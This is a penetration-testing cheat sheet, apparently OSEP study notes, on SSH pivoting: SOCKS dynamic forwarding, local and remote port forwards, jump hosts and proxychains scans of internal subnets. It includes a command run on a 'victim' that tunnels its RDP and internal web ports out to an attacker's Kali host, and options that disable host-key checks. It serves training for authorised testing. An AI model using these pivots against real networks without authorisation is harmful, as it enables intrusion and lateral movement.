# SSH Port Forwarding

Use when you have SSH credentials to the pivot host.

## Dynamic port forwarding — SOCKS proxy (most useful)

```bash
# Creates SOCKS5 at 127.0.0.1:1080, tunneled over SSH to pivot
ssh -D 1080 -N -f user@pivot_host

# Options:
# -D 1080       = dynamic (SOCKS) forward on local port 1080
# -N            = no shell (just forward)
# -f            = background the SSH process
# -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  = skip key check

# With key auth
ssh -D 1080 -N -f -i ~/.ssh/id_rsa user@pivot_host

# Then configure proxychains:
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445,3389 172.16.1.0/24
```

## Local port forward (-L)

Forward a port on Kali to a specific internal host:port via the pivot.

```bash
# Kali:3390 → pivot → 172.16.1.5:3389
ssh -L 3390:172.16.1.5:3389 -N -f user@pivot_host
xfreerdp /v:127.0.0.1:3390 /u:admin /p:Pass123

# Kali:8080 → pivot → internal web:80
ssh -L 8080:172.16.1.10:80 -N -f user@pivot_host
curl http://127.0.0.1:8080/admin

# Multiple forwards at once
ssh -L 3390:172.16.1.5:3389 -L 8080:172.16.1.10:80 -N -f user@pivot_host
```

## Remote port forward (-R)

Victim SSHes OUT to Kali and creates a reverse tunnel. Use when Kali can't SSH in.

```bash
# Run ON the victim: victim's 3389 appears on Kali:3390
ssh -R 3390:127.0.0.1:3389 -N -f kaliuser@192.168.45.202

# Or: victim exposes an internal host's port to Kali
ssh -R 8080:172.16.1.10:80 -N -f kaliuser@192.168.45.202
```

## Jump hosts (-J) — SSH through a pivot directly

```bash
# Connect to target through pivot (no intermediate shell)
ssh -J user@pivot_host user@target_host

# SOCKS through a jump
ssh -J user@pivot_host -D 1080 -N user@target_host

# Two hops
ssh -J user@pivot1,user@pivot2 user@final_target

# Two-hop dynamic SOCKS
ssh -J user@pivot1,user@pivot2 -D 1080 -N user@final_target
```

## ~/.ssh/config template for OSEP

```
Host pivot
    HostName 192.168.45.10
    User pentester
    IdentityFile ~/.ssh/id_rsa
    DynamicForward 1080
    ServerAliveInterval 30
    ServerAliveCountMax 3

# Then just: ssh -N pivot
```

## Useful one-liners

```bash
# Background SSH SOCKS, no host key check
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -D 1080 -N -f user@pivot_host

# Kill the background SSH tunnel
pkill -f "ssh.*-D 1080"

# List active SSH tunnels
ps aux | grep "ssh.*-[DNR]"
```
